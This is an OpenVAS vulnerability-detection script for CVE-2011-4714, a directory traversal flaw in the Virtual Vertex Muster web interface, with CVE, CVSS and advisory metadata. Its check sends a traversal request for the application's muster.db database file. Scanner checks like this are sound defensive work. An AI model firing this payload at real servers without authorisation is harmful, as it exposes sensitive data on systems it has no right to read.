###############################################################################
# OpenVAS Vulnerability Test
#
# Virtual Vertex Muster Web Interface Directory Traversal Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802279");
  script_version("2019-05-13T14:05:09+0000");
  script_cve_id("CVE-2011-4714");
  script_bugtraq_id(50841);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2019-05-13 14:05:09 +0000 (Mon, 13 May 2019)");
  script_tag(name:"creation_date", value:"2011-11-30 13:13:13 +0530 (Wed, 30 Nov 2011)");
  script_name("Virtual Vertex Muster Web Interface Directory Traversal Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/46991");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/46991");
  script_xref(name:"URL", value:"http://www.security-assessment.com/files/documents/advisory/Muster-Arbitrary_File_Download.pdf");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 8690);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain sensitive information
  that could aid in further attacks.");

  script_tag(name:"affected", value:"Virtual Vertex Muster version 6.1.6.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of URI containing ../(dot dot)
  sequences, which allows attackers to read arbitrary files via directory traversal attacks.");

  script_tag(name:"solution", value:"Upgrade to Virtual Vertex Muster version 6.2.0 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"The host is running Virtual Vertex Muster and is prone to directory
  traversal vulnerability.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8690);

res = http_get_cache(item:"/dologin.html", port:port);

if("<title>Muster 6 Integrated Web server" >< res) {
  url = "/a\..\..\muster.db";
  if(http_vuln_check(port:port, url:url, pattern:"SQLite format", check_header:TRUE)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
  }
}
